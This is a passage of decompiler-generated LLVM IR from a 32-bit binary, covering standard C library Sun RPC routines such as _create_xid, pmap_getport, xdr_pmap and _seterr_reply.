  %v2_8062a03 = add i32 %v1_8062a01, -12
  %v3_8062a03 = inttoptr i32 %v2_8062a03 to i32*
  store i32 %v2_8062679, i32* %v3_8062a03, align 4
  %v0_8062a04 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8062a04 = add i32 %v1_8062a01, -16
  %v3_8062a04 = inttoptr i32 %v2_8062a04 to i32*
  store i32 %v0_8062a04, i32* %v3_8062a04, align 4
  %v0_8062a05 = load i32, i32* %stack_var_-20, align 4
  %v2_8062a05 = call i32 @xdr_opaque_auth(i32 %v0_8062a05, i32 %v0_80624f9)
  store i32 %v2_8062a05, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062a40

dec_label_pc_8062a0f:                             ; preds = %dec_label_pc_80629ad
  %tmp133 = icmp slt i32 %stack_var_-9020.0, 1
  br i1 %tmp133, label %dec_label_pc_8062a40, label %dec_label_pc_8062a18

dec_label_pc_8062a18:                             ; preds = %dec_label_pc_8062a0f
  store i32 %tmp111, i32* @ebx, align 4
  %v2_8062a1e = load i32, i32* %arg1, align 4
  store i32 %v2_8062a1e, i32* %eax.global-to-local, align 4
  %v1_8062a20 = add i32 %v2_8062a1e, 32
  %v2_8062a20 = inttoptr i32 %v1_8062a20 to i32*
  %v3_8062a20 = load i32, i32* %v2_8062a20, align 4
  store i32 %v3_8062a20, i32* %edx.global-to-local, align 4
  %v3_8062a23 = inttoptr i32 %v0_80629b9 to i32*
  store i32 %v2_8062a1e, i32* %v3_8062a23, align 4
  %v1_8062a24 = add i32 %v0_80629b9, -4
  %v2_8062a24 = inttoptr i32 %v1_8062a24 to i32*
  store i32 134621735, i32* %v2_8062a24, align 4
  %v3_8062a24 = load i32, i32* %edx.global-to-local, align 4
  %v4_8062a24 = add i32 %v3_8062a24, 12
  %v5_8062a24 = inttoptr i32 %v4_8062a24 to i32*
  %v6_8062a24 = load i32, i32* %v5_8062a24, align 4
  call void @__pseudo_call(i32 %v6_8062a24)
  %v1_8062a2a = icmp eq i32 %v2_8062a1e, 0
  br i1 %v1_8062a2a, label %dec_label_pc_8062a40, label %dec_label_pc_8062a2e

dec_label_pc_8062a2e:                             ; preds = %dec_label_pc_8062a18
  %v0_8062a27 = load i32, i32* @esp, align 4
  %v1_8062a27 = add i32 %v0_8062a27, 16
  %v4_8062a2e = add i32 %stack_var_-9020.0, -1
  %v0_8062594.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062594

dec_label_pc_8062a39:                             ; preds = %dec_label_pc_8062986
  %v2_8062a39 = inttoptr i32 %v1_8062a39 to i32*
  store i32 2, i32* %v2_8062a39, align 4
  br label %dec_label_pc_8062a40

dec_label_pc_8062a40:                             ; preds = %dec_label_pc_8062a18, %dec_label_pc_8062a0f, %dec_label_pc_80629ec, %dec_label_pc_80629f5, %dec_label_pc_8062a39
  %v0_8062a40 = load i32, i32* @esi, align 4
  %v1_8062a40 = add i32 %v0_8062a40, 44
  %v2_8062a40 = inttoptr i32 %v1_8062a40 to i32*
  %v3_8062a40 = load i32, i32* %v2_8062a40, align 4
  store i32 %v3_8062a40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062a43

dec_label_pc_8062a43:                             ; preds = %dec_label_pc_8062958, %dec_label_pc_80627c7, %dec_label_pc_8062537, %dec_label_pc_806260f, %dec_label_pc_8062a40
  %v0_8062a4a = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8062a4a

; uselistorder directives
  uselistorder i32 %v2_80629cb, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80629b9, { 5, 6, 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_80629a2, { 3, 0, 1, 2 }
  uselistorder i32 %v1_806293b, { 1, 2, 0 }
  uselistorder i32 %v1_8062932, { 1, 0 }
  uselistorder i32 %v6_806292d, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 %v1_8062914, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8062905, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8062552, { 1, 2, 0 }
  uselistorder i32 %v1_80628fb, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8062886, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_806286e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_8062869, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8062812, { 0, 3, 2, 1, 4 }
  uselistorder i32 %storemerge7.in.lcssa, { 1, 2, 0 }
  uselistorder i32 %v4_8062795, { 1, 0 }
  uselistorder i32 %v4_806278b, { 0, 2, 1 }
  uselistorder i32 %v1_8062742, { 2, 1, 0 }
  uselistorder i32 %v3_806273d, { 1, 2, 0 }
  uselistorder i32 %stack_var_-9016.3161, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80626d6, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v0_80626bf, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_80626ba, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80626ad, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.2, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32 %stack_var_-9008.2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v1_806267f, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-9028.1, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8062639, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80625f3, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_80625e2, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_80625d8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_8062594, { 1, 0, 2, 4, 5, 6, 7, 8, 3, 9 }
  uselistorder i32 %stack_var_-9020.0, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-9008.0, { 1, 0 }
  uselistorder i32 %stack_var_-9004.0, { 1, 0 }
  uselistorder i32 %stack_var_-9012.0, { 1, 0 }
  uselistorder i32 %stack_var_-9016.0, { 1, 0 }
  uselistorder i32 %v0_80625a7, { 1, 0 }
  uselistorder i32 %v2_8062994, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v2_806282e, { 2, 3, 4, 5, 0, 1 }
  uselistorder i1 %v4_806259d, { 1, 0 }
  uselistorder i32 %storemerge3, { 0, 4, 3, 2, 1 }
  uselistorder i32 %stack_var_-9000.0, { 1, 0, 2 }
  uselistorder i32 %v3_806251d, { 2, 1, 0 }
  uselistorder i32 %v2_8062515, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80624f9, { 2, 3, 1, 0 }
  uselistorder i32 %v0_80624f8, { 1, 0 }
  uselistorder i32 %v0_80624f7, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i16* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %tmp111, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 54, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 40, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 49, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 18, 46, 47, 48, 63, 62, 64, 65 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 2, 4, 0, 1, 3 }
  uselistorder i32 ()* @bcmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8800, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 -28, { 6, 7, 3, 2, 1, 4, 8, 32, 0, 9, 5, 10, 11, 12, 17, 18, 16, 15, 14, 13, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 -24, { 7, 8, 33, 32, 2, 1, 0, 3, 9, 4, 10, 11, 12, 17, 18, 16, 15, 14, 13, 20, 19, 21, 22, 23, 24, 25, 26, 27, 5, 6, 28, 29, 30, 31 }
  uselistorder i64 1000, { 1, 0, 2 }
  uselistorder i32 1000, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8062a43, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8062a40, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80629ec, { 1, 0 }
  uselistorder label %dec_label_pc_8062958, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_806294f, { 1, 0 }
  uselistorder label %dec_label_pc_8062911, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80628eb, { 1, 0 }
  uselistorder label %dec_label_pc_8062785, { 1, 0 }
  uselistorder label %dec_label_pc_806271c, { 1, 0 }
  uselistorder label %dec_label_pc_80626ad, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_806256c, { 1, 0 }
}

define i32 @_create_xid() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_8062a5a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8062a5a, i32* @ebx, align 4
  %v4_8062a5f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_807d228.796 to i32))
  %v1_8062a6b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807d228.796 to i32))
  %v0_8062a73 = load i8, i8* @global_var_807d240.797, align 64
  %v1_8062a73 = icmp eq i8 %v0_8062a73, 0
  %v1_8062a7a = icmp eq i1 %v1_8062a73, false
  br i1 %v1_8062a7a, label %dec_label_pc_8062aa9, label %dec_label_pc_8062a7c

dec_label_pc_8062a7c:                             ; preds = %entry
  %v0_8062a7c = load i32, i32* @ecx, align 4
  %v2_8062a80 = ptrtoint i32* %stack_var_-16 to i32
  %v4_8062a85 = call i32 @gettimeofday(i32 %v2_8062a80, i32 0, i32 %v0_8062a7c, i32 %v0_8062a7c)
  %v4_8062a95 = load i32, i32* %stack_var_-16, align 4
  %v5_8062a95 = xor i32 %v4_8062a95, %tmp
  %v2_8062a9a = trunc i32 %v5_8062a95 to i16
  %v3_8062a9a = call i32 @__GI_srand48_r(i16 %v2_8062a9a, i32 ptrtoint (i32* @global_var_807d244.798 to i32))
  store i8 1, i8* @global_var_807d240.797, align 64
  br label %dec_label_pc_8062aa9

dec_label_pc_8062aa9:                             ; preds = %entry, %dec_label_pc_8062a7c
  %v2_8062aa9 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8062aad = load i32, i32* @ecx, align 4
  %v4_8062ab5 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_807d244.798 to i32), i32 %v2_8062aa9, i32 %v0_8062aad, i32 %v0_8062aad)
  %v3_8062abf = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v3_8062ac4 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_8062ac4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_807d244.798 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @gettimeofday, { 0, 2, 1 }
  uselistorder i8* @global_var_807d240.797, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_807d228.796 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8062aa9, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-14 = alloca i16, align 2
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8062ad0 = load i32, i32* @edi, align 4
  %v0_8062ad2 = load i32, i32* @ebx, align 4
  store i32 %v0_8062ad2, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  store i16 0, i16* %stack_var_-14, align 2
  store i32 -1, i32* %stack_var_-20, align 4
  %v1_8062ae9 = add i32 %arg1, 2
  %v2_8062ae9 = inttoptr i32 %v1_8062ae9 to i16*
  store i16 28416, i16* %v2_8062ae9, align 2
  %v2_8062af9 = ptrtoint i32* %stack_var_-20 to i32
  %v0_8062b11 = load i32, i32* @edi, align 4
  %v9_8062b12 = call i32 @__GI_clntudp_bufcreate(i32 %v0_8062b11, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8062af9, i32 400, i32 400)
  store i32 %v9_8062b12, i32* @ebx, align 4
  %v1_8062b1c = icmp eq i32 %v9_8062b12, 0
  br i1 %v1_8062b1c, label %dec_label_pc_8062bad, label %dec_label_pc_8062ba0

dec_label_pc_8062ba0:                             ; preds = %entry
  %v0_8062b24 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8062b24, i32* %esi.global-to-local, align 4
  %v0_8062b53 = load i32, i32* @ebx, align 4
  %v1_8062b53 = add i32 %v0_8062b53, 4
  %v2_8062b53 = inttoptr i32 %v1_8062b53 to i32*
  %v3_8062b53 = load i32, i32* %v2_8062b53, align 4
  store i32 %v3_8062b53, i32* @ecx, align 4
  %v5_8062b71 = inttoptr i32 %v3_8062b53 to i32*
  %v6_8062b71 = load i32, i32* %v5_8062b71, align 4
  call void @__pseudo_call(i32 %v6_8062b71)
  %v0_8062b7a = load i32, i32* %esi.global-to-local, align 4
  %v1_8062b7a = inttoptr i32 %v0_8062b7a to i32*
  store i32 14, i32* %v1_8062b7a, align 4
  %v0_8062b85 = load i32, i32* @ebx, align 4
  %v1_8062b85 = add i32 %v0_8062b85, 4
  %v2_8062b85 = inttoptr i32 %v1_8062b85 to i32*
  %v3_8062b85 = load i32, i32* %v2_8062b85, align 4
  %v5_8062b8a = add i32 %v3_8062b85, 8
  %v6_8062b8a = inttoptr i32 %v5_8062b8a to i32*
  %v7_8062b8a = load i32, i32* %v6_8062b8a, align 4
  call void @__pseudo_call(i32 %v7_8062b8a)
  %v0_8062ba3 = load i32, i32* @ebx, align 4
  %v1_8062ba3 = add i32 %v0_8062ba3, 4
  %v2_8062ba3 = inttoptr i32 %v1_8062ba3 to i32*
  %v3_8062ba3 = load i32, i32* %v2_8062ba3, align 4
  %v5_8062ba7 = add i32 %v3_8062ba3, 16
  %v6_8062ba7 = inttoptr i32 %v5_8062ba7 to i32*
  %v7_8062ba7 = load i32, i32* %v6_8062ba7, align 4
  call void @__pseudo_call(i32 %v7_8062ba7)
  br label %dec_label_pc_8062bad

dec_label_pc_8062bad:                             ; preds = %entry, %dec_label_pc_8062ba0
  %v0_8062bad = load i32, i32* @edi, align 4
  %v1_8062bad = add i32 %v0_8062bad, 2
  %v2_8062bad = inttoptr i32 %v1_8062bad to i16*
  store i16 0, i16* %v2_8062bad, align 2
  %v3_8062bb3 = load i16, i16* %stack_var_-14, align 2
  %v4_8062bb3 = sext i16 %v3_8062bb3 to i32
  %v2_8062bbb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8062bbb, i32* @ebx, align 4
  store i32 %v0_8062ad0, i32* @edi, align 4
  ret i32 %v4_8062bb3

; uselistorder directives
  uselistorder i32 %v9_8062b12, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i16* %stack_var_-14, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062bad, { 1, 0 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %v0_8062bc0 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v2_8062bcf = inttoptr i32 %arg1 to i32*
  %v3_8062bcf = call i32 @xdr_u_long(i32* %v2_8062bcf, i32 %arg2)
  %v1_8062bd7 = icmp eq i32 %v3_8062bcf, 0
  br i1 %v1_8062bd7, label %dec_label_pc_8062c14, label %dec_label_pc_8062bdb

dec_label_pc_8062bdb:                             ; preds = %entry
  %v0_8062bdd = load i32, i32* @ebx, align 4
  %v1_8062bdd = add i32 %v0_8062bdd, 4
  store i32 %v1_8062bdd, i32* @eax, align 4
  %v0_8062be1 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062be2 = inttoptr i32 %v0_8062be1 to i32*
  %v3_8062be2 = call i32 @xdr_u_long(i32* %v2_8062be2, i32 %v1_8062bdd)
  %v1_8062bea = icmp eq i32 %v3_8062be2, 0
  br i1 %v1_8062bea, label %dec_label_pc_8062c14, label %dec_label_pc_8062bee

dec_label_pc_8062bee:                             ; preds = %dec_label_pc_8062bdb
  %v0_8062bf0 = load i32, i32* @ebx, align 4
  %v1_8062bf0 = add i32 %v0_8062bf0, 8
  store i32 %v1_8062bf0, i32* @eax, align 4
  %v0_8062bf4 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062bf5 = inttoptr i32 %v0_8062bf4 to i32*
  %v3_8062bf5 = call i32 @xdr_u_long(i32* %v2_8062bf5, i32 %v1_8062bf0)
  %v1_8062bfd = icmp eq i32 %v3_8062bf5, 0
  br i1 %v1_8062bfd, label %dec_label_pc_8062c14, label %dec_label_pc_8062c01

dec_label_pc_8062c01:                             ; preds = %dec_label_pc_8062bee
  %v0_8062c01 = load i32, i32* @ebx, align 4
  %v1_8062c01 = add i32 %v0_8062c01, 12
  store i32 %v1_8062c01, i32* @eax, align 4
  %v0_8062c04 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8062bc0, i32* %esi.global-to-local, align 4
  %v2_8062c0f = inttoptr i32 %v0_8062c04 to i32*
  %v3_8062c0f = call i32 @xdr_u_long(i32* %v2_8062c0f, i32 %v1_8062c01)
  br label %dec_label_pc_8062c14

dec_label_pc_8062c14:                             ; preds = %dec_label_pc_8062bee, %dec_label_pc_8062bdb, %entry, %dec_label_pc_8062c01
  store i32 %v0_8062bc0, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8062bc0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062c14, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  store i32 %tmp, i32* %edx.global-to-local, align 4
  %v1_8062c24 = add i32 %tmp2, 8
  %v2_8062c24 = inttoptr i32 %v1_8062c24 to i32*
  %v3_8062c24 = load i32, i32* %v2_8062c24, align 4
  store i32 %v3_8062c24, i32* %eax.global-to-local, align 4
  %v1_8062c27 = icmp eq i32 %v3_8062c24, 0
  br i1 %v1_8062c27, label %dec_label_pc_8062c34, label %dec_label_pc_8062c2b

dec_label_pc_8062c2b:                             ; preds = %entry
  %v1_8062c2b = add i32 %v3_8062c24, -1
  %v8_8062c2b = icmp eq i32 %v1_8062c2b, 0
  store i32 %v1_8062c2b, i32* %eax.global-to-local, align 4
  %v1_8062c2c = icmp eq i1 %v8_8062c2b, false
  br i1 %v1_8062c2c, label %dec_label_pc_8062cbc, label %dec_label_pc_8062c8d

dec_label_pc_8062c34:                             ; preds = %entry
  %v1_8062c34 = add i32 %tmp2, 24
  %v2_8062c34 = inttoptr i32 %v1_8062c34 to i32*
  %v3_8062c34 = load i32, i32* %v2_8062c34, align 4
  store i32 %v3_8062c34, i32* %eax.global-to-local, align 4
  %v1_8062c37 = icmp eq i32 %v3_8062c34, 0
  %v1_8062c39 = icmp eq i1 %v1_8062c37, false
  br i1 %v1_8062c39, label %dec_label_pc_8062c42, label %dec_label_pc_8062c3b

dec_label_pc_8062c3b:                             ; preds = %dec_label_pc_8062c34
  %v1_8062c3b = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_8062c3b, align 4
  %v0_8062c41 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8062c41

dec_label_pc_8062c42:                             ; preds = %dec_label_pc_8062c34
  switch i32 %tmp2, label %dec_label_pc_8062c7e [
    i32 0, label %dec_label_pc_8062c76
    i32 1, label %dec_label_pc_8062c4e
    i32 2, label %dec_label_pc_8062c56
    i32 3, label %dec_label_pc_8062c5e
    i32 4, label %dec_label_pc_8062c66
    i32 5, label %dec_label_pc_8062c6e
  ]

dec_label_pc_8062c4e:                             ; preds = %dec_label_pc_8062c42
  %v1_8062c4e = inttoptr i32 %tmp to i32*
  store i32 8, i32* %v1_8062c4e, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062c56:                             ; preds = %dec_label_pc_8062c42
  %v1_8062c56 = inttoptr i32 %tmp to i32*
  store i32 9, i32* %v1_8062c56, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062c5e:                             ; preds = %dec_label_pc_8062c42
  %v1_8062c5e = inttoptr i32 %tmp to i32*
  store i32 10, i32* %v1_8062c5e, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062c66:                             ; preds = %dec_label_pc_8062c42
  %v1_8062c66 = inttoptr i32 %tmp to i32*
  store i32 11, i32* %v1_8062c66, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062c6e:                             ; preds = %dec_label_pc_8062c42
  %v1_8062c6e = inttoptr i32 %tmp to i32*
  store i32 12, i32* %v1_8062c6e, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062c76:                             ; preds = %dec_label_pc_8062c42
  %v1_8062c76 = inttoptr i32 %tmp to i32*
  store i32 0, i32* %v1_8062c76, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062c7e:                             ; preds = %dec_label_pc_8062c42
  %v1_8062c7e = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_8062c7e, align 4
  %v0_8062c84 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062c84 = add i32 %v0_8062c84, 4
  %v2_8062c84 = inttoptr i32 %v1_8062c84 to i32*
  store i32 0, i32* %v2_8062c84, align 4
  br label %dec_label_pc_8062cb7

dec_label_pc_8062c8d:                             ; preds = %dec_label_pc_8062c2b
  %v1_8062c8d = add i32 %tmp2, 12
  %v2_8062c8d = inttoptr i32 %v1_8062c8d to i32*
  %v3_8062c8d = load i32, i32* %v2_8062c8d, align 4
  store i32 %v3_8062c8d, i32* %eax.global-to-local, align 4
  %v9_8062c90 = icmp eq i32 %v3_8062c8d, 1
  br i1 %v9_8062c90, label %dec_label_pc_8062ca2, label %dec_label_pc_8062c95

dec_label_pc_8062c95:                             ; preds = %dec_label_pc_8062c8d
  %v9_8062c95 = icmp eq i32 %v3_8062c8d, 6
  %v1_8062c98 = icmp eq i1 %v9_8062c95, false
  %v1_8062caa = inttoptr i32 %tmp to i32*
  br i1 %v1_8062c98, label %dec_label_pc_8062caa, label %dec_label_pc_8062c9a

dec_label_pc_8062c9a:                             ; preds = %dec_label_pc_8062c95
  store i32 6, i32* %v1_8062caa, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062ca2:                             ; preds = %dec_label_pc_8062c8d
  %v1_8062ca2 = inttoptr i32 %tmp to i32*
  store i32 7, i32* %v1_8062ca2, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062caa:                             ; preds = %dec_label_pc_8062c95
  store i32 16, i32* %v1_8062caa, align 4
  %v0_8062cb0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062cb0 = add i32 %v0_8062cb0, 4
  %v2_8062cb0 = inttoptr i32 %v1_8062cb0 to i32*
  store i32 1, i32* %v2_8062cb0, align 4
  br label %dec_label_pc_8062cb7

dec_label_pc_8062cb7:                             ; preds = %dec_label_pc_8062c7e, %dec_label_pc_8062caa
  %v0_8062cb7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062cb7 = load i32, i32* %edx.global-to-local, align 4
  %v2_8062cb7 = add i32 %v1_8062cb7, 8
  %v3_8062cb7 = inttoptr i32 %v2_8062cb7 to i32*
  store i32 %v0_8062cb7, i32* %v3_8062cb7, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062cbc:                             ; preds = %dec_label_pc_8062c2b
  %v1_8062cbc = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_8062cbc, align 4
  %v0_8062cc2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062cc2 = add i32 %v0_8062cc2, 8
  %v2_8062cc2 = inttoptr i32 %v1_8062cc2 to i32*
  %v3_8062cc2 = load i32, i32* %v2_8062cc2, align 4
  store i32 %v3_8062cc2, i32* %eax.global-to-local, align 4
  %v1_8062cc5 = load i32, i32* %edx.global-to-local, align 4
  %v2_8062cc5 = add i32 %v1_8062cc5, 4
  %v3_8062cc5 = inttoptr i32 %v2_8062cc5 to i32*
  store i32 %v3_8062cc2, i32* %v3_8062cc5, align 4
  br label %dec_label_pc_8062cc8

dec_label_pc_8062cc8:                             ; preds = %dec_label_pc_8062c76, %dec_label_pc_8062c6e, %dec_label_pc_8062c66, %dec_label_pc_8062c5e, %dec_label_pc_8062c56, %dec_label_pc_8062c4e, %dec_label_pc_8062cb7, %dec_label_pc_8062ca2, %dec_label_pc_8062c9a, %dec_label_pc_8062cbc
  %v0_8062cc8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062cc8 = inttoptr i32 %v0_8062cc8 to i32*
  %v2_8062cc8 = load i32, i32* %v1_8062cc8, align 4
  store i32 %v2_8062cc8, i32* %eax.global-to-local, align 4
  %v9_8062cca = icmp eq i32 %v2_8062cc8, 7
  br i1 %v9_8062cca, label %dec_label_pc_8062ce6, label %dec_label_pc_8062ccf

dec_label_pc_8062ccf:                             ; preds = %dec_label_pc_8062cc8
  %v9_8062ccf = icmp eq i32 %v2_8062cc8, 9
  br i1 %v9_8062ccf, label %dec_label_pc_8062ced, label %dec_label_pc_8062cd4

dec_label_pc_8062cd4:                             ; preds = %dec_label_pc_8062ccf
  %v9_8062cd4 = icmp eq i32 %v2_8062cc8, 6
  %v1_8062cd7 = icmp eq i1 %v9_8062cd4, false
  br i1 %v1_8062cd7, label %dec_label_pc_8062cf9, label %dec_label_pc_8062cd9

dec_label_pc_8062cd9:                             ; preds = %dec_label_pc_8062cd4
  %v0_8062cd9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062cd9 = add i32 %v0_8062cd9, 16
  %v2_8062cd9 = inttoptr i32 %v1_8062cd9 to i32*
  %v3_8062cd9 = load i32, i32* %v2_8062cd9, align 4
  store i32 %v3_8062cd9, i32* %eax.global-to-local, align 4
  %v2_8062cdc = add i32 %v0_8062cc8, 4
  %v3_8062cdc = inttoptr i32 %v2_8062cdc to i32*
  store i32 %v3_8062cd9, i32* %v3_8062cdc, align 4
  %v0_8062cdf = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062cdf = add i32 %v0_8062cdf, 20
  %v2_8062cdf = inttoptr i32 %v1_8062cdf to i32*
  %v3_8062cdf = load i32, i32* %v2_8062cdf, align 4
  store i32 %v3_8062cdf, i32* %eax.global-to-local, align 4
  %v1_8062ce2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8062ce2 = add i32 %v1_8062ce2, 8
  %v3_8062ce2 = inttoptr i32 %v2_8062ce2 to i32*
  store i32 %v3_8062cdf, i32* %v3_8062ce2, align 4
  ret i32 %v3_8062cdf

dec_label_pc_8062ce6:                             ; preds = %dec_label_pc_8062cc8
  %v0_8062ce6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062ce6 = add i32 %v0_8062ce6, 16
  %v2_8062ce6 = inttoptr i32 %v1_8062ce6 to i32*
  %v3_8062ce6 = load i32, i32* %v2_8062ce6, align 4
  store i32 %v3_8062ce6, i32* %eax.global-to-local, align 4
  %v2_8062ce9 = add i32 %v0_8062cc8, 4
  %v3_8062ce9 = inttoptr i32 %v2_8062ce9 to i32*
  store i32 %v3_8062ce6, i32* %v3_8062ce9, align 4
  ret i32 %v3_8062ce6

dec_label_pc_8062ced:                             ; preds = %dec_label_pc_8062ccf
  %v0_8062ced = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062ced = add i32 %v0_8062ced, 28
  %v2_8062ced = inttoptr i32 %v1_8062ced to i32*
  %v3_8062ced = load i32, i32* %v2_8062ced, align 4
  store i32 %v3_8062ced, i32* %eax.global-to-local, align 4
  %v2_8062cf0 = add i32 %v0_8062cc8, 4
  %v3_8062cf0 = inttoptr i32 %v2_8062cf0 to i32*
  store i32 %v3_8062ced, i32* %v3_8062cf0, align 4
  %v0_8062cf3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062cf3 = add i32 %v0_8062cf3, 32
  %v2_8062cf3 = inttoptr i32 %v1_8062cf3 to i32*
  %v3_8062cf3 = load i32, i32* %v2_8062cf3, align 4
  store i32 %v3_8062cf3, i32* %eax.global-to-local, align 4
  %v1_8062cf6 = load i32, i32* %edx.global-to-local, align 4
  %v2_8062cf6 = add i32 %v1_8062cf6, 8
  %v3_8062cf6 = inttoptr i32 %v2_8062cf6 to i32*
  store i32 %v3_8062cf3, i32* %v3_8062cf6, align 4
  %v0_8062cf9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062cf9

